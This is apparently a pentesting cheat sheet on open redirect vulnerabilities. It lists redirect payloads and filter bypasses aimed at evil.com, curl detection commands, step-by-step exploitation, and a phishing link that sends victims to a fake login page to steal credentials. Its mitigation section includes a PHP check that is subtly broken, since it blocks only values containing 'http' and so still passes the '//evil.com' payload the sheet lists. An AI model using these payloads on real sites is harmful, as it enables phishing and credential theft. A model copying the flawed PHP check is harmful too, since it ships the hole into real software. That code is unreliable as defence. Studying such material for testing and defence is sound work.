📌 Open Redirect

🧠 Description

What is Open Redirect?

Open Redirect occurs when an application accepts an untrusted URL parameter and redirects the user to that URL without proper validation. Attackers can use this to redirect users to malicious sites for phishing attacks.

🏷️ Classification

  • Type: Security Misconfiguration / Input Validation
  • OWASP: A01:2021 – Broken Access Control
  • CWE: CWE-601: URL Redirection to Untrusted Site

🎯 Attack Surface

  • ✅ Login/Logout redirect parameters (?next=, ?redirect=)
  • ✅ Return URL parameters (?return_to=, ?redirect_uri=)
  • ✅ Referer header manipulation
  • ✅ Open Graph / social media redirects

💣 Basic Payloads

https://target.com/redirect?url=https://evil.com
https://target.com/login?next=//evil.com
https://target.com/return?redirect_uri=//evil.com
https://target.com/logout?return_to=https://evil.com

https://target.com/redirect?url=https://evil.com@target.com
https://target.com/redirect?url=//evil.com%2F%2Ftarget.com

https://target.com/redirect?url=//evil.com/../target.com

https://target.com/redirect?url=https%3A%2F%2Fevil.com
https://target.com/redirect?url=https%253A%252F%252Fevil.com
https://target.com/redirect?url=https%3A//evil.com
https://target.com/redirect?url=https：//evil.com（全角コロン）

🔍 Detection Methodology

# Check for redirect parameters
grep -r "redirect" requests.txt
grep -r "return" requests.txt
grep -r "next" requests.txt
grep -r "url" requests.txt

# Test with curl
curl -i "https://target.com/login?next=https://evil.com"

⚙️ Exploitation Steps

  1. Identify redirect parameters (next=, redirect=, return_to=)
  2. Test with external domain (?next=https://evil.com)
  3. Check if redirection occurs
  4. If filtered, try bypass techniques
  5. Create phishing link: https://target.com/login?next=https://evil.com/fake-login
🎣 Phishing Exploit Example
# Malicious link to send to victims
https://legitimate-site.com/login?next=https://attacker.com/fake-login-page

# Victims see legitimate domain but get redirected to fake page
# Fake page mimics login to steal credentials

🛡️ Mitigation

✅ Use allowlist of allowed domains: Only redirect to trusted domains
✅ Validate URL structure: Ensure redirect is relative path, not absolute URL
✅ Use token-based validation: Generate and validate redirect tokens
✅ Warn users: Display warning before external redirects
✅ Don't accept user-controlled redirect URLs when possible 
# Secure redirect validation (Python)
ALLOWED_DOMAINS = ['target.com', 'sub.target.com']

def validate_redirect(url):
    parsed = urlparse(url)
    if parsed.netloc in ALLOWED_DOMAINS:
        return url
    return '/dashboard'

# PHP - Only allow relative paths
if (strpos($_GET['redirect'], 'http') !== false) {
    header('Location: /home');
} else {
    header('Location: ' . $_GET['redirect']);
}

⚠️ Risk / Impact

Severity: Low to Medium

Impact:
  • Phishing attacks using trusted domain
  • Credential theft
  • Bypass CSRF protections
  • SEO spam / reputation damage
